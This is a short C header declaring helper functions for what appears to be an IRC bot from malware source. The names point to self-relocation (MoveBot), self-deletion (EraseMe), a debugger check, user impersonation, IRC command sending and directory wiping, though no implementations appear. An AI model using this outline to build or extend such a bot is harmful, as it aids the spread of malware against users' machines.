#ifdef _DEBUG
void DbgPrintFile(char *Format, ...);
#endif

BOOL IsBugged();
char *substr(char *input, int start, int end);
char *replacestr(char *str, const char *substr, const char *repstr);

BOOL FileExists(LPSTR lpszFilename);
BOOL IsFolder(LPSTR lpszFilename);

size_t FileSize(const char *filename);
int SplitParams(char *a[MAX_TOKENS],char *line,int depth);
int SplitSwitches(char *a[MAX_TOKENS],unsigned char *s[MAX_TOKENS]);
BOOL SetFileTime(char *Filename);
BOOL MoveBot(char *MovePath,char *Filename);
int wildcardfit(char *wildcard, char *test);
void GetInstalledTime(void);
void EraseMe(BOOL nopause=FALSE);

void uninstall(BOOL thread=FALSE, BOOL difbot=FALSE);
char *commaI64(unsigned __int64 number);
char *commaI64(unsigned __int64 number, char *str);

#ifndef NO_SERVICE
void ImpersonateInteractiveUser(void);
#endif

BOOL AIM_Profile(char *msg,BOOL restore);
#ifndef NO_MIRCCMD
BOOL SendIrcCommand(const char *str);
#endif

BOOL IsServiceRunning(char *name);
void RemoveCompleteDirectory(char* path);